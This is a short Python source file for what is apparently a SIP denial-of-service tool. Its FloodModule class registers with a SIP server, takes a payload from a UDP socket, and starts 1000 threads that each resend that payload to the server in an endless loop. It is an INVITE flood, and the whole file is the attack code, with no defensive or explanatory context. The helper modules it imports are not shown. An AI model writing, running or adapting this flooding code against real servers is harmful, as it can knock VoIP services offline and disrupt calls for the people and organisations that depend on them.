import socket
import threading
import registerClient
import sendInvite
import time


class FloodModule:
    s = None
    data = []
    running = None

    def __init__(self):
        self.running = False
        self.s = sendInvite.SendInvite

    def fire_thread(self, payload):
        """Call sendInvite to fire payload to the SIP server"""
        global running
        running = True
        while running:
            self.s.fire(payload)

    def init_flooding(self, serveraddress, local_ip):
        r = registerClient.RegisterClient(serveraddress, 40000, local_ip)
        r.register()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", 50000))

        buffersize = 1024
        while not self.data:
            self.data = sock.recvfrom(buffersize)
        decoded = self.data[0].decode()
        threads = []
        for i in range(0, 1000):
            t = threading.Thread(target=self.fire_thread, args=(decoded,))
            t.daemon = True
            threads.append(t)

        for i in range(0, 1000):
            threads[i].start()

        while True:
            time.sleep(1)